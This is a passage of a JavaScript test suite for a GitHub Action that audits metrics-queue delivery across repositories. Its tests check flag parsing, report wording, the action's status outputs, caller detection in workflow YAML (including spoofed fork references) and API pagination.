        return [{ ...pr(10, '2026-06-01T00:00:00Z', shared), updated_at: '2026-06-01T00:00:00Z' }];
      if (path.includes('/commits?')) return [];
      if (path.includes('/runs?'))
        return [
          // dedupeByHead keeps ONE run per head. Neither concluded success here,
          // so it keeps the newest — run 900 — and run 901 is discarded unprobed.
          run(900, shared, 'failure', '2026-06-01T00:01:00Z'),
          run(901, shared, 'cancelled', '2026-06-01T00:00:30Z'),
        ];
      throw new Error(`unexpected ghPaged ${path}`);
    },
    gh: async (path) => {
      if (path.includes('per_page=1&created=')) return { total_count: 1 };
      if (path.endsWith('/runs/900/jobs?per_page=100')) return jobsDiedEarly();
      // The discarded sibling is where the delivery actually happened.
      if (path.endsWith('/runs/901/jobs?per_page=100')) return jobsWithStep('success');
      if (path.includes('/contents/')) return { type: 'file' };
      throw new Error(`unexpected gh ${path}`);
    },
    ghCount: async () => 1,
  };

  const res = await auditRepo(
    client,
    {
      owner: 'praetorian-inc',
      callerFile: 'c.yml',
      callerPath: '.github/workflows/c.yml',
      since: '2026-05-01',
    },
    'guard',
  );

  assert.deepEqual(res.classes.failed, []);
  assert.deepEqual(res.classes.delivered.map((r) => r.number), [10]);
  assert.equal(res.classes.delivered[0].sent_by_run_id, 901);
  // And it survives the SECOND probe path: verifyPayloads runs after this and
  // would re-read run 900 (which did not send) if needsPayloadProbe let it
  // through, demoting the delivery just proved.
  assert.deepEqual(res.classes.payload_missing, []);
  assert.equal(replayList(res.classes).includes(10), false);
});

test('unverifiableReasons: the distinct set, sorted, ignoring records with none', () => {
  // Distinct because a 200-record class would otherwise print the same sentence
  // 200 times; sorted so two runs over the same data render byte-identical, which
  // is what makes the paired-run diff a usable control.
  assert.deepEqual(
    unverifiableReasons([
      { unverifiable_reason: UNVERIFIABLE_REAPED },
      { unverifiable_reason: UNVERIFIABLE_JOBS_UNREADABLE },
      { unverifiable_reason: UNVERIFIABLE_REAPED },
      { number: 3 },
    ]),
    [UNVERIFIABLE_JOBS_UNREADABLE, UNVERIFIABLE_REAPED].sort(),
  );
  assert.deepEqual(unverifiableReasons([]), []);
  assert.deepEqual(unverifiableReasons([{ number: 1 }]), []);
});

test('buildReport: fleet-wide unverifiable reasons UNION across repos', () => {
  // Two repos, one cause each: a fleet sentence built from either repo alone
  // would be false for the other's records. It also sits OUTSIDE `totals`,
  // because every other key there is a count and a consumer summing the object
  // would trip over an array.
  const report = buildReport(
    [
      repoResult('guard', {
        merged: 1,
        unverifiable: [{ ...rec(77), unverifiable_reason: UNVERIFIABLE_REAPED }],
      }),
      repoResult('palatine', {
        merged: 1,
        unverifiable: [{ ...rec(88), unverifiable_reason: UNVERIFIABLE_JOBS_UNREADABLE }],
      }),
    ],
    { since: '2026-07-05', selfAudit: true },
    1,
  );
  assert.deepEqual(
    report.unverifiable_reasons,
    [UNVERIFIABLE_JOBS_UNREADABLE, UNVERIFIABLE_REAPED].sort(),
  );
  assert.equal('unverifiable_reasons' in report.totals, false);
  for (const v of Object.values(report.totals)) assert.equal(typeof v, 'number');
});

// --- Round 10: the empty-value class, remaining two members -----------------
//
// The `--repo` fix (round 4) and the `--repos` fix each closed the cited
// instance and left the class open. `--since` and `--until` were the last two
// members: their entire validation body is gated on `if (out.since)` /
// `if (out.until)`, both false for '', so an empty flag read as ABSENT rather
// than as invalid. Four tests: one per flag, each asserting the MESSAGE and not
// merely that something threw, plus a control per flag proving a real value
// still parses — a guard that rejects '' by rejecting everything would pass a
// bare assert.throws.

test('parseArgs: --since= with an empty value is rejected, not silently defaulted', () => {
  assert.throws(
    () => parseArgs(['--repo=praetorian-inc/guard', '--since=']),
    // The message is asserted because the failure mode being prevented is a
    // WRONG CAUSE, not merely a missing throw: if some later format check ever
    // catches '' first, it would report "must be YYYY-MM-DD" for a flag the
    // caller never meant to set, and the operator would go looking at their
    // date format instead of at their unset shell variable.
    /--since was passed with an empty value/,
  );
});

test('parseArgs: --until= with an empty value is rejected, not silently unbounded', () => {
  assert.throws(
    () => parseArgs(['--repo=praetorian-inc/guard', '--since=2026-01-01', '--until=']),
    /--until was passed with an empty value/,
  );
});

test('parseArgs: --days= with an empty value is rejected by NAME, not as a malformed integer', () => {
  // Unlike the four sibling flags, '' was never a silent fallback here — it
  // already failed the integer check — so this pins the MESSAGE only (round 22,
  // gemini): the error must name the actual mistake, an unset shell variable,
  // not report `got ` as if the caller mistyped a number.
  assert.throws(
    () => parseArgs(['--repo=praetorian-inc/guard', '--days=']),
    /--days was passed with an empty value/,
  );
});

test('parseArgs: CONTROL — real --since/--until values still parse after the empty guards', () => {
  // Without this, both tests above stay green against a guard that rejects
  // every value of either flag, which would break the rename remediation the
  // tool itself prints.
  const out = parseArgs([
    '--repo=praetorian-inc/guard',
    '--since=2026-01-01',
    '--until=2026-02-01',
  ]);
  assert.equal(out.since, '2026-01-01');
  assert.equal(out.until, '2026-02-01');
});

test('parseArgs: CONTROL — an OMITTED --until is still absent, not an error', () => {
  // '' and unset must stay distinguishable: `null` means "up to now" and is the
  // default the action relies on when its `until` input is not supplied.
  const out = parseArgs(['--repo=praetorian-inc/guard', '--since=2026-01-01']);
  assert.equal(out.since, '2026-01-01');
  assert.equal(out.until, null);
});

// --- Round 10: the report states its evidence ceiling -----------------------
//
// The audit's deepest probe is step-level (probeSqsStep reads the SQS step's
// conclusion), so `delivered` means "enqueued", never "scored". The GAPS
// direction was sound; the CLEAN direction claimed more than the evidence
// supports. ENG-5775 is a measured instance of a consumer shipping dark while
// producers stayed green, so the unstated boundary was the live failure mode.
// ENG-5689 requires the fix to state what its signal does not cover.

test('renderMarkdown: the CLEAN report states the queue-only coverage ceiling', () => {
  const clean = {
    since: '2026-07-05',
    totals: { merged_prs: 12, delivered: 12, in_flight: 0, pre_onboarding: 0 },
    repos_with_gaps: [],
    repos: [{ repo: 'guard', has_caller: true }],
  };

  const md = renderMarkdown(clean, CFG);

  // This branch returns EARLY, before the footer, so the ceiling has to be
  // emitted on the branch itself — a footer-only fix would leave the one report
  // that says "nothing to do" as the only one that overclaims.
  assert.match(md, /verifies delivery \*\*to the metrics queue\*\* only/);
  assert.match(md, /invisible here/);
  assert.match(md, /ENG-5688/);
});

test('renderMarkdown: the GAPS report states the same ceiling', () => {
  const md = renderMarkdown(gapReport(), CFG);
  assert.match(md, /verifies delivery \*\*to the metrics queue\*\* only/);
  assert.match(md, /ENG-5688/);
});

test('renderMarkdown: the CAVEATED clean report states the ceiling too', () => {
  // The third of the three exits out of renderMarkdown. undecidedCaveats covers
  // classes the audit cannot DECIDE; the ceiling covers the boundary past which
  // it cannot SEE. They are different claims and this branch needs both.
  const caveated = {
    since: '2026-07-05',
    totals: { merged_prs: 40, delivered: 30, in_flight: 3, pre_onboarding: 7 },
    repos_with_gaps: [],
    repos: [{ repo: 'guard', has_caller: true }],
  };

  const md = renderMarkdown(caveated, CFG);

  assert.match(md, /No gaps among the PRs this audit can decide/);
  assert.match(md, /verifies delivery \*\*to the metrics queue\*\* only/);
});

test('renderMarkdown: CONTROL — the clean sentence no longer claims delivery was SCORED', () => {
  // The wording fix is the other half of the ceiling: the old sentence, "has a
  // successful metrics delivery", reads as "this PR was scored". Asserting the
  // absence of the old string would go vacuous the moment the wording changes
  // again, so assert the positive property instead — the sentence describes an
  // ENQUEUE.
  const clean = {
    since: '2026-07-05',
    totals: { merged_prs: 12, delivered: 12, in_flight: 0, pre_onboarding: 0 },
    repos_with_gaps: [],
    repos: [{ repo: 'guard', has_caller: true }],
  };

  const md = renderMarkdown(clean, CFG);

  assert.match(md, /enqueued a successful metrics delivery/);
  assert.doesNotMatch(md, /CodeCommit` row for every/);
});

// --- Round 11: the `status` output contract, EXECUTED rather than asserted ---
//
// `status` was added this round because `has-gaps` cannot express "could not
// run": nothing sets it on the unknown path, it resolves to '', and
// `has-gaps != 'true'` is TRUE for '' — so a caller branching that way reads a
// failed audit as CLEAN. That is the same false-clean class this whole action
// exists to detect, which is why the contract needs tests that can FAIL rather
// than a description promising it.
//
// A grep for `status=` in action.yml would pin nothing: it stays green if the
// write lands after the exit, on the wrong arm, or with the wrong value. These
// tests execute the SHIPPED bash from action.yml against a stubbed detector and
// read the real $GITHUB_OUTPUT, so all three `case "$rc"` arms and all three
// pre-detector guards are covered by their observable effect.
import { mkdirSync, chmodSync, existsSync } from 'node:fs';
import { spawnSync } from 'node:child_process';

const RUN_BODY = (() => {
  const lines = readFileSync(join(HERE, 'action.yml'), 'utf8').split('\n');
  const i = lines.findIndex((l) => /^ {6}run: \|\s*$/.test(l));
  if (i === -1) {
    throw new Error(
      'could not locate the composite `run: |` body in action.yml — if the step ' +
        'was reformatted, update this extractor; do NOT delete these tests, or the ' +
        'status contract goes unexercised',
    );
  }
  const body = [];
  for (const l of lines.slice(i + 1)) {
    if (l.trim() === '') {
      body.push('');
      continue;
    }
    if (!l.startsWith(' '.repeat(8))) break;
    body.push(l.slice(8));
  }
  const src = body.join('\n');
  // Same INVALID-MUTANT discipline the mutation harness uses: an extractor that
  // silently grabbed the wrong region would make every test below vacuously
  // green. Assert the region is the one intended, loudly.
  //
  // STRUCTURAL markers only. This list originally also named `status=clean` /
  // `status=gaps` / `status=unknown`, which was a mistake worth recording: the
  // sentinel then asserted the very thing the tests below assert, so deleting a
  // status write threw HERE, at module load, taking all nine tests down with a
  // confusing "extractor drifted" instead of producing one clean red. A sentinel
  // must establish only that the right REGION was found; what the region must
  // contain is the tests' job. Verified by mutants L and M, which were invalid
  // under the old list and kill cleanly under this one.
  for (const needle of ['set -euo pipefail', 'case "$rc"', '$GITHUB_OUTPUT', 'audit-delivery.mjs']) {
    if (!src.includes(needle)) {
      throw new Error(`extracted run body is missing \`${needle}\` — the extractor drifted`);
    }
  }
  return src;
})();

// Stubs the detector so each `case "$rc"` arm is reachable without a network.
// The real script's contract is: write --json / --markdown, exit 0 clean, 1 gaps,
// 2 could-not-run.
// The stub is written to `audit-delivery.mjs`, so it is ESM and `require` is not
// defined there — a stub using it dies with exit 1, which the run body reads as
// arm 1 and reports as `status=gaps`. That fails LOUDLY as a wrong status value
// rather than quietly, but it is worth naming: a broken stub impersonates the
// exact arm these tests are trying to distinguish.
const detectorStub = (exitCode, report) => `
import { writeFileSync } from 'node:fs';
const args = process.argv.slice(1);
const val = (f) => { const a = args.find((x) => x.startsWith(f + '=')); return a ? a.slice(f.length + 1) : null; };
const report = ${JSON.stringify(report)};
if (report !== null) {
  const j = val('--json'); if (j) writeFileSync(j, JSON.stringify(report));
  const m = val('--markdown'); if (m) writeFileSync(m, '# report\\n');
}
process.exit(${exitCode});
`;

let actRun = 0;
// `dir` is accepted so a test can invoke the action TWICE against one runner
// temp — the two-invocations case below, which a fresh dir per call cannot
// express. Returned for the same reason.
const runAction = ({ repo = 'guard', token = 'tok', exitCode = 0, report = { repos_with_gaps: [] }, staleFixedPathReport = false, lockTemp = false, dir = null } = {}) => {
  dir = dir ?? mkdtempSync(join(tmpdir(), `audit-act-${actRun++}-`));
  const actionPath = join(dir, 'action');
  const runnerTemp = join(dir, 'rt');
  if (!existsSync(actionPath)) mkdirSync(actionPath);
  if (!existsSync(runnerTemp)) mkdirSync(runnerTemp);
  if (staleFixedPathReport) writeFileSync(join(runnerTemp, 'audit-delivery.json'), '{"stale":true}');
  writeFileSync(join(actionPath, 'audit-delivery.mjs'), detectorStub(exitCode, report));
  if (lockTemp) chmodSync(runnerTemp, 0o500);
  const ghOutput = join(dir, 'gh-output');
  writeFileSync(ghOutput, '');
  const res = spawnSync('bash', ['-c', RUN_BODY], {
    encoding: 'utf8',
    env: {
      PATH: `${dirname(process.execPath)}:${process.env.PATH ?? ''}`,
      GITHUB_TOKEN: token,
      REPO: repo,
      DAYS: '30',
      SINCE: '',
      UNTIL: '',
      CALLER_PATH: '.github/workflows/leaderboard.yml',
      BACKFILL_CALLER: 'leaderboard-backfill-caller.yml',
      ACTION_PATH: actionPath,
      RUNNER_TEMP: runnerTemp,
      GITHUB_OUTPUT: ghOutput,
    },
  });
  if (lockTemp) chmodSync(runnerTemp, 0o700); // so mkdtemp cleanup is possible
  const raw = readFileSync(ghOutput, 'utf8');
  const outputs = Object.fromEntries(
    raw
      .split('\n')
      .filter((l) => l.includes('='))
      .map((l) => [l.slice(0, l.indexOf('=')), l.slice(l.indexOf('=') + 1)]),
  );
  // stdout as well as stderr: `::error::` workflow commands go to STDOUT, so a
  // test asserting a guard's message against stderr fails while the guard works.
  return { code: res.status, stdout: res.stdout, stderr: res.stderr, outputs, raw, dir, runnerTemp };
};

test('action contract: a clean run reports status=clean with has_gaps false', () => {
  const r = runAction({ exitCode: 0 });
  assert.equal(r.code, 0);
  assert.equal(r.outputs.status, 'clean');
  assert.equal(r.outputs.has_gaps, 'false');
  assert.equal(r.outputs.gap_count, '0');
});

test('action contract: a gaps run reports status=gaps and counts the affected PRs', () => {
  // 2 replay + 1 payload_missing, plus 1 replay = 4. Same hand-derived literal
  // shape as the gap-counter tests: counting either field alone gives a
  // different answer, so a half-right counter cannot pass.
  const r = runAction({
    exitCode: 1,
    report: {
      repos_with_gaps: [
        { repo: 'guard', replay: [1, 2], payload_missing: 1 },
        { repo: 'palatine', replay: [3], payload_missing: 0 },
      ],
    },
  });
  assert.equal(r.outputs.status, 'gaps');
  assert.equal(r.outputs.has_gaps, 'true');
  assert.equal(r.outputs.gap_count, '4');
});

test('action contract: an exit-2 could-not-run reports status=unknown, not a missing output', () => {
  // The reason `status` exists. The step fails (exit 1) so a caller must set
  // continue-on-error to read it, but `unknown` is WRITTEN — the caller can tell
  // "audit says clean" from "audit could not tell", which `has-gaps` alone cannot.
  const r = runAction({ exitCode: 2, report: null });
  assert.equal(r.code, 1);
  assert.equal(r.outputs.status, 'unknown');
  assert.equal(r.outputs.has_gaps, undefined);
});

test('action contract: an exit-2 that still left a JSON report does NOT read as a completed run', () => {
  // Reproduced this round: buildReport returns before EITHER write, so an
  // exit-2 raised inside the markdown write leaves a complete, valid JSON on
  // disk and publishes its path. A caller inferring "a report exists, so the
  // audit ran" gets a false clean. status must still say unknown.
  const r = runAction({ exitCode: 2, report: { repos_with_gaps: [] } });
  assert.equal(r.outputs.status, 'unknown');
  assert.match(r.outputs.report_json ?? '', /audit-delivery\.json$/);
  assert.equal(r.outputs.has_gaps, undefined);
});

test('action contract: the empty-repo guard writes status=unknown before exiting', () => {
  const r = runAction({ repo: '' });
  assert.equal(r.code, 1);
  assert.equal(r.outputs.status, 'unknown');
});

test('action contract: the empty-token guard writes status=unknown before exiting', () => {
  const r = runAction({ token: '' });
  assert.equal(r.code, 1);
  assert.equal(r.outputs.status, 'unknown');
});

test('action contract: a report directory that cannot be CREATED writes status=unknown before exiting', (t) => {
  // The third status-less path, found by grepping every exit and then noticing
  // this one was not an `exit` statement at all — a bare `set -e` abort. Round 18
  // that was `rm -f` on a fixed path (which ignores a MISSING file but still
  // fails on an undeletable one); round 19 replaced the fixed path with
  // `mktemp -d`, so the aborting command changed while the hazard did not: a
  // silent abort here writes ZERO bytes to $GITHUB_OUTPUT and a caller on
  // continue-on-error reads the unset `status` as clean.
  //
  // Skipped when the check cannot hold: root ignores mode bits, so mktemp would
  // succeed and the test would assert nothing.
  if (typeof process.getuid === 'function' && process.getuid() === 0) {
    t.skip('running as root — mode 500 does not prevent directory creation, so this case is unreachable');
    return;
  }
  const r = runAction({ lockTemp: true });
  assert.equal(r.code, 1);
  assert.equal(r.outputs.status, 'unknown');
  // Asserted on the MESSAGE, not just on exit-1-plus-unknown: the repo and token
  // guards produce that identical pair, so a bare status check here would stay
  // green if this guard vanished and some earlier guard fired instead.
  assert.match(r.stdout, /refusing to run/);
});

test('action contract: TWO invocations in one job publish two DISTINCT report paths', () => {
  // The fix S-3 bought, asserted as behaviour rather than as the presence of
  // `mktemp` in the source. Round 18 wrote both reports to
  // $RUNNER_TEMP/audit-delivery.json: the second overwrote the first while BOTH
  // steps' outputs still named that one file, so a caller commenting each report
  // posted the same content twice — and the documented remedy was a prose
  // contract ("call this action at most once per job") that nothing enforced.
  //
  // Same runner temp for both calls, which is the whole point; a fresh temp per
  // call would pass against the round-18 code too.
  const first = runAction({ exitCode: 0 });
  const second = runAction({ dir: first.dir, exitCode: 1, report: { repos_with_gaps: [{ repo: 'guard', replay: [1], payload_missing: 0 }] } });

  assert.equal(first.outputs.status, 'clean');
  assert.equal(second.outputs.status, 'gaps');
  assert.notEqual(first.outputs.report_json, second.outputs.report_json);
  assert.notEqual(first.outputs.report_markdown, second.outputs.report_markdown);
  // Both must still EXIST at the end — the failure being closed is not that the
  // paths differ but that the first one survives the second run intact.
  assert.ok(existsSync(first.outputs.report_json), 'the first report must survive the second invocation');
  assert.ok(existsSync(second.outputs.report_json));
  // And each must hold ITS OWN run's content. Distinct paths where the second
  // clobbered the first would satisfy every assertion above.
  assert.deepEqual(JSON.parse(readFileSync(first.outputs.report_json, 'utf8')).repos_with_gaps, []);
  assert.equal(JSON.parse(readFileSync(second.outputs.report_json, 'utf8')).repos_with_gaps.length, 1);
  // The basenames are deliberately unchanged, so a caller that recognises
  // artifacts by name still does.
  assert.match(first.outputs.report_json, /\/audit-delivery\.json$/);
  assert.match(second.outputs.report_json, /\/audit-delivery\.json$/);
});

test('action contract: a stale report at the ROUND-18 fixed path is never published', () => {
  // The other half of the same fix, and the reason it is structural rather than
  // a second convention: with the report directory freshly minted, a file
  // sitting at the old fixed location is not merely deleted, it is
  // unreachable — the `[ -f ]` publish checks cannot see it, so there is no
  // window in which they could publish it. A test that only compared two paths
  // would stay green if someone reinstated the fixed path plus an `rm`.
  const r = runAction({ staleFixedPathReport: true, exitCode: 2, report: null });
  assert.equal(r.outputs.status, 'unknown');
  assert.notEqual(r.outputs.report_json, join(r.runnerTemp, 'audit-delivery.json'));
  // The stale file is still on disk, untouched — proving the run did not merely
  // overwrite it, and that the published path (if any) is a different file.
  assert.equal(readFileSync(join(r.runnerTemp, 'audit-delivery.json'), 'utf8'), '{"stale":true}');
});

test('action contract: CONTROL — every status value the action can emit is one of three', () => {
  // Guards the vocabulary itself. A fourth value, or a typo'd `clean ` with a
  // trailing space, breaks every caller's `if` without breaking any test above.
  const seen = [
    runAction({ exitCode: 0 }).outputs.status,
    runAction({ exitCode: 1, report: { repos_with_gaps: [{ repo: 'g', replay: [1], payload_missing: 0 }] } }).outputs.status,
    runAction({ exitCode: 2, report: null }).outputs.status,
  ];
  assert.deepEqual(seen, ['clean', 'gaps', 'unknown']);
});

// ── Round 12: mentions vs calls, mutable pagination, and command injection ────
//
// All four areas below were reported by an automated reviewer and CONFIRMED by
// measurement against the live API before a line was changed. Each test is
// written to fail for the original defect specifically, not for "something in
// this area changed".

// The two hasCaller fixtures are the REAL files in this repository, not
// hand-written strings. That is deliberate: the defect was a substring probe
// matching this repo's own commented caller template, so a synthetic fixture
// would only prove the fix handles the example I invented. Reading the artifact
// means the test fails if the artifact ever grows a new way to fool the probe.
const WF_DIR = join(HERE, '..', '..', 'workflows');
const readWf = (name) => {
  try {
    return readFileSync(join(WF_DIR, name), 'utf8');
  } catch {
    throw new Error(
      `could not read .github/workflows/${name} — these two tests use the REAL files as ` +
        'fixtures on purpose. If the file moved, repoint WF_DIR; do NOT delete these tests, ' +
        'or the mention-vs-call distinction goes unexercised.',
    );
  }
};
const callerCfg = () => parseArgs(['--repo', 'praetorian-inc/public-workflows']);
const contentClient = (text) => ({
  gh: async () => ({ type: 'file', content: Buffer.from(text, 'utf8').toString('base64') }),
});

test('hasCaller: a COMMENTED caller template is a MENTION, not a caller', async () => {
  // The confirmed defect, on the DEFAULT caller path, in org-enumerated fleet
  // mode. public-workflows is the reusable's own home, so --caller-path resolves
  // to the reusable itself, which carries a commented drop-in template naming its
  // own pinned ref. Pre-fix hasCaller matched that substring and admitted this
  // repo to the fleet, while the runs endpoint for that path reports
  // total_count=0 (the real deliveries are recorded against
  // leaderboard-metrics-caller.yml, total_count=15) — so every merged PR would
  // classify never_fired and the report would print a PROD replay command for
  // deliveries that had actually succeeded.
  const cfg = callerCfg();
  const reusable = readWf('leaderboard-metrics.yml');

  // ANTI-VACUOUS: if the commented template is ever deleted, this test would pass
  // for the wrong reason — there would be nothing left to mistake for a caller.
  // Assert the trap is still in the fixture before asserting we avoid it.
  const commentedRef = reusable
    .split('\n')
    .filter((l) => l.trimStart().startsWith('#') && l.includes(cfg.reusable));
  assert.ok(
    commentedRef.length > 0,
    'fixture no longer contains a commented reference to the reusable, so this test ' +
      'proves nothing — restore one or delete the test deliberately',
  );
  assert.ok(
    commentedRef.some((l) => /uses:/.test(l)),
    'the commented reference must still be a `uses:` line — that is the exact shape ' +
      'that fooled the probe, and a bare prose mention is a weaker fixture',
  );

  assert.equal(await hasCaller(contentClient(reusable), cfg, 'public-workflows'), false);
});

test('hasCaller: CONTROL — a real caller with a trailing version comment IS a caller', async () => {
  // The over-rejection direction, which the test above cannot see: a fix that
  // simply refused any line containing `#` would also refuse every real caller in
  // the fleet, because the pinned `uses:` line carries a trailing ` # v2.16.3`
  // version comment. That failure is SILENT and worse than the bug being fixed —
  // a repo dropped from the fleet is never audited and the fleet still reports
  // clean. The comment strip has to be anchored, and this is what says so.
  const cfg = callerCfg();
  const caller = readWf('leaderboard-metrics-caller.yml');
  assert.ok(
    /uses:.*\S\s+#\s*\S/.test(caller),
    'fixture must still carry a `uses:` line with a TRAILING comment, or the ' +
      'over-rejection case is not exercised',
  );
  assert.equal(await hasCaller(contentClient(caller), cfg, 'public-workflows'), true);
});

test('hasCaller: a mention outside a `uses:` line is not a caller', async () => {
  // Prose, a docs block, a heredoc in a run: step. Same reusable string, no call.
  const cfg = callerCfg();
  const text = `name: x\n# see ${cfg.reusable}abc for details\njobs:\n  a:\n    steps:\n      - run: echo "${cfg.reusable}abc"\n`;
  assert.equal(await hasCaller(contentClient(text), cfg, 'guard'), false);
});

test('hasCaller: a `uses:` line inside a run: BLOCK is shell text, not a call', async () => {
  // The other member of the class the comment strip closed one instance of. This
  // line is not commented and it does contain `uses:`, so it defeated BOTH halves
  // of the previous fix — and lands the same harm: hasCaller true, the reusable
  // accrues no runs of its own, every merged PR classifies never_fired, and the
  // report prints a PROD replay command for deliveries that succeeded.
  const cfg = callerCfg();
  const text = [
    'name: lint',
    'jobs:',
    '  check:',
    '    runs-on: ubuntu-latest',
    '    steps:',
    '      - name: assert every repo pins the reusable',
    '        run: |',
    '          cat > expected <<EOF',
    `          uses: ${cfg.reusable}@abc123`,
    '          EOF',
    '          diff expected actual',
    '',
    '          echo done',
    '',
  ].join('\n');

  // ANTI-VACUOUS: the trap must be present and must be the exact shape that
  // defeats the older rule, or a `false` here proves nothing.
  const trap = text.split('\n').filter((l) => l.includes(cfg.reusable));
  assert.equal(trap.length, 1, 'fixture must carry exactly one reference to the reusable');
  assert.ok(!trap[0].trimStart().startsWith('#'), 'the trap must NOT be a comment');
  assert.match(trap[0], /uses:\s/, 'the trap must sit on a `uses:` line');

  assert.equal(await hasCaller(contentClient(text), cfg, 'guard'), false);
});

test('hasCaller: CONTROL — a real `uses:` after a run: block IS still a caller', async () => {
  // The over-skip direction, which the test above cannot see, and the dangerous
  // one: a block-scalar rule that swallowed too much would drop real callers from
  // the fleet SILENTLY, and an unaudited repo still reports clean. The dedent has
  // to CLOSE the block: a rule that opens one and never closes it blanks every
  // `uses:` from that point on, and this fixture is what says so, because its
  // reusable reference sits after a `run: |` block rather than before one.
  const cfg = callerCfg();
  const text = [
    'name: metrics',
    'jobs:',
    '  pre:',
    '    steps:',
    '      - run: |',
    '          echo hello',
    '        name: after the block, same step',
    '  deliver:',
    `    uses: ${cfg.reusable}@abc123 # v1.2.3`,
    '    secrets: inherit',
    '',
  ].join('\n');
  assert.equal(await hasCaller(contentClient(text), cfg, 'guard'), true);
});

test('hasCaller: a FORK of the reusable under another owner is NOT the reusable', async () => {
  // Round 22 (codex): the owner-less needle, matched with includes(), admitted
  // this shape as an official caller. A fork's deliveries never reach the prod
  // queue, so the false fleet member classifies every merged PR never_fired and
  // the report prints a prod replay list — the same harm, through the same
  // over-detect direction, as the commented-template case above.
  const cfg = callerCfg();
  const text = [
    'jobs:',
    '  m:',
    '    uses: attacker/public-workflows/.github/workflows/leaderboard-metrics.yml@abc123',
    '',
  ].join('\n');
  assert.equal(await hasCaller(contentClient(text), cfg, 'guard'), false);
});

test('hasCaller: the official ref embedded in another repo PATH is not a caller — the match anchors at the value START', async () => {
  // The half-fix trap: making the needle owner-ful while keeping includes()
  // closes the fork case above but still matches the full official string
  // appearing as a path SEGMENT of some other owner/repo. Only anchoring at the
  // value's first byte closes both, so this row exists to fail that half-fix.
  const cfg = callerCfg();
  const text = ['jobs:', '  m:', `    uses: evil/repo/${cfg.reusable}abc123`, ''].join('\n');
  assert.equal(await hasCaller(contentClient(text), cfg, 'guard'), false);
});

test('yamlStructureLines: block content is blanked, structure and line count survive', () => {
  // Blanked rather than dropped, so a line number still means something to
  // anyone debugging a probe result; and asserted directly because the matcher
  // above can pass for the wrong reason if this returns nothing at all.
  const src = [
    'a: 1', //            0  kept
    'b: |', //            1  kept (the opener itself)
    '  uses: x', //       2  blanked — block content
    '', //                3  blank inside the block
    '  still: block', //  4  blanked
    'c: >-', //           5  kept (folded, with a chomping indicator)
    '  more text', //     6  blanked
    'd: > not a block', //7  kept — a plain scalar that starts with '>'
    'e: 2', //            8  kept
  ].join('\n');

  assert.deepEqual(yamlStructureLines(src), [
    'a: 1',
    'b: |',
    '',
    '',
    '',
    'c: >-',
    '',
    'd: > not a block',
    'e: 2',
  ]);
});

test('ghPaged: a Link URL containing a comma still paginates', async () => {
  // Pre-fix the header was split on ',', so a comma inside a query parameter cut
  // the rel="next" entry in half; the surviving half had no opening '<' and the
  // slice returned junk, so pagination stopped at page 1 SILENTLY. A truncated
  // fetch read as a complete one is a false clean, which is the direction that
  // matters. No URL this script builds carries a comma today — this pins the
  // parser, not a live exploit.
  const pages = new Map([
    [
      'https://api.github.com/x?ids=1,2&page=1',
      { items: [{ id: 1 }], link: '<https://api.github.com/x?ids=1,2&page=2>; rel="next"' },
    ],
    ['https://api.github.com/x?ids=1,2&page=2', { items: [{ id: 2 }], link: '' }],
  ]);
  const got = await withFetch(
    async (url) => {
      const p = pages.get(String(url));
      if (!p) throw new Error(`unexpected url ${url}`);
      return { status: 200, ok: true, headers: new Headers({ link: p.link }), json: async () => p.items };
    },
    () =>
      makeClient('t').ghPaged('https://api.github.com/x?ids=1,2&page=1', undefined, {
        identity: (x) => x.id,
      }),
  );
  assert.deepEqual(
    got.map((x) => x.id),
    [1, 2],
    'page 2 must be fetched — stopping at page 1 is the silent truncation',
  );
});

test('ghPaged: a row served twice across pages is counted ONCE', async () => {
  // Offset pagination over a list that mutates can serve the same row on two
  // pages. A duplicate double-counts a merged PR, and in runsInRange it inflates
  // `got.length`, which can MASK the shortfall assertion that is the only thing
  // standing between this audit and the silent 1000-result clamp. Deduping makes
  // that assertion strictly stronger.
  const pages = [
    { items: [{ id: 1 }, { id: 2 }], link: '<https://api.github.com/y?page=2>; rel="next"' },
    { items: [{ id: 2 }, { id: 3 }], link: '' },
  ];
  let i = 0;
  const client = makeClient('t');
  const got = await withFetch(
    async () => {
      const p = pages[i++];
      return { status: 200, ok: true, headers: new Headers({ link: p.link }), json: async () => p.items };
    },
    () => client.ghPaged('https://api.github.com/y?page=1', undefined, { identity: (x) => x.id }),
  );
  assert.deepEqual(got.map((x) => x.id), [1, 2, 3]);
  assert.equal(client.state.dupes, 1, 'the duplicate must be COUNTED, not silently absorbed');
});

test('auditRepo: the closed-PR walk is ordered by an IMMUTABLE key', async () => {
  // The defect: `sort=updated&direction=desc` orders by the most frequently
  // mutated field on the resource. Offset pagination reads POSITIONS, so a PR
  // touched between page N and N+1 jumps to position 1, every row behind it
  // shifts back one, and the row at the page boundary lands BEHIND the cursor and
  // is never returned — dropped from the audit. A dropped merged PR cannot be
  // reported as a gap, so the loss direction is a FALSE CLEAN.
  //
  // Asserted on the request itself because that is where the property lives: no
  // response this stub can return distinguishes a sound ordering from an unsound
  // one. A drift simulation would only re-assert that offset pagination drifts.
  const paths = [];
  const client = {
    ghPaged: async (path) => {
      paths.push(path);
      if (path.includes('/pulls?')) return [];
      return [];
    },
    gh: async (path) => (path.includes('per_page=1&created=') ? { total_count: 0 } : {}),
    ghCount: async (path) => {
      paths.push(path);
      return 0;
    },
  };
  await auditRepo(
    client,
    { owner: 'praetorian-inc', callerFile: 'c.yml', callerPath: '.github/workflows/c.yml', since: '2026-05-01', until: null },
    'guard',
  );
  const pulls = paths.find((p) => p.includes('/pulls?') && p.includes('per_page='));
  assert.ok(pulls, 'auditRepo must fetch closed PRs');
  assert.match(pulls, /sort=created/, 'must order by an immutable key');
  assert.match(pulls, /direction=asc/, 'asc is load-bearing: desc puts new rows at position 1');
  assert.doesNotMatch(pulls, /sort=updated/, 'updated_at is the mutable key that caused the loss');
});

test('resolveFleet: org enumeration is ordered by an immutable key', async () => {
  // Same class one level up, same false-clean direction: this endpoint defaults to
  // created DESC, so a repo created mid-enumeration shifts a boundary row past the
  // cursor and a whole repo silently leaves the fleet — never audited, reports
  // nothing, fleet still says clean.
  const paths = [];
  const fleet = await resolveFleet(
    {
      ghPaged: async (path) => {
        paths.push(path);
        return [];
      },
      gh: async () => ({}),
    },
    { owner: 'praetorian-inc', repos: null, callerPath: '.github/workflows/c.yml', reusable: 'r' },
  );
  assert.deepEqual(fleet, []);
  assert.match(paths[0], /sort=created/);
  assert.match(paths[0], /direction=asc/);
});

test('wfEscape: % is escaped FIRST, or the escapes get re-escaped', () => {
  // Order is the whole correctness of this function. Escaping \n before % turns
  // "\n" into "%0A" and then into "%250A", which the runner renders as the
  // literal text %0A instead of a newline — a message quietly corrupted by its
